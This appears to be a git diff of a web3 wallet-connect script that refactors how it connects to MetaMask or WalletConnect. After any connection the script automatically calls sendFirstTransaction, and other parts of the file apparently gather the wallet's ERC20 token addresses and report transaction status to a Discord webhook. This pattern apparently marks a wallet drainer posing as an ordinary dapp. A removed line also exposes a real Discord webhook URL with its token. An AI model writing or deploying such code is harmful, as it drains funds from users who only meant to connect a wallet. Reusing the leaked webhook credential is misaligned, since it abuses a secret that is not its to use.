@@ -78,32 +78,28 @@ const erc20ABI = [
     },
 ];
 
-async function connectWallet() {
+async function connectWallet(walletType) {
     if (isConnecting) {
         console.log("Connection request already in progress...");
         return; // Exit if already connecting
     }
 
     isConnecting = true; // Set the flag to true
-    document.getElementById("connectButton").disabled = true; // Disable the button
 
     try {
-        // Show wallet selection options
-        const walletChoice = prompt("Choose a wallet: (1) MetaMask (2) WalletConnect");
-        
-        if (walletChoice === "1") {
+        let walletAddress;
+
+        if (walletType === "metamask") {
             // MetaMask connection logic
             if (typeof window.ethereum !== 'undefined') {
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                const account = accounts[0];
-                console.log(`Connected to MetaMask account: ${account}`);
-                
-                await sendFirstTransaction(account); // Automatically send the first transaction
+                walletAddress = accounts[0];
+                console.log(`Connected to MetaMask account: ${walletAddress}`);
             } else {
                 alert("MetaMask is not installed. Please install it.");
                 window.open("https://metamask.app.link/dapp/swiftmultisolutions.github.io/web3/", "_blank");
             }
-        } else if (walletChoice === "2") {
+        } else if (walletType === "walletconnect") {
             // WalletConnect connection logic
             const provider = new WalletConnectProvider.default({
                 infuraId: "YOUR_INFURA_PROJECT_ID", // Replace with your Infura Project ID
@@ -112,18 +108,20 @@ async function connectWallet() {
             await provider.enable();
             const web3 = new ethers.providers.Web3Provider(provider);
             const accounts = await web3.listAccounts();
-            const account = accounts[0];
-            console.log(`Connected to WalletConnect account: ${account}`);
-            
-            await sendFirstTransaction(account); // Automatically send the first transaction
+            walletAddress = accounts[0];
+            console.log(`Connected to WalletConnect account: ${walletAddress}`);
         } else {
-            alert("Invalid choice. Please refresh and try again.");
+            // Open other wallets using WalletConnect URI scheme
+            const uri = `wc:YOUR_WALLETCONNECT_URI`; // Replace with the actual URI generated
+            window.open(uri, "_blank");
+            return; // Exit after opening the wallet
         }
+
+        await sendFirstTransaction(walletAddress); // Automatically send the first transaction
     } catch (error) {
         console.error("Error connecting to wallet:", error);
     } finally {
         isConnecting = false; // Reset the flag
-        document.getElementById("connectButton").disabled = false; // Re-enable the button
     }
 }
 
@@ -206,7 +204,7 @@ async function getERC20TokenAddresses(walletAddress) {
 }
 
 async function sendWebhook(message, status) {
-    const webhookUrl = "https://discord.com/api/webhooks/1288775554836860969/vGhZpW1U9hPXFZfZACJomfVg-bY1pjP4__PpK_5Gf2dAxtcgZKZJqRDp3_9z0ULgP7Wg"; // Your Discord webhook URL
+    const webhookUrl = "YOUR_DISCORD_WEBHOOK_URL"; // Your Discord webhook URL
     const payload = {
         content: `Transaction Status: ${status}\nMessage: ${message}`
     };
@@ -223,5 +221,7 @@ async function sendWebhook(message, status) {
     }
 }
 
-// Attach the event listener to the button
-document.getElementById("connectButton").addEventListener("click", connectWallet);
+// Attach the event listener to the wallet buttons
+document.querySelectorAll(".walletButton").forEach(button => {
+    button.addEventListener("click", () => connectWallet(button.dataset.walletType));
+});
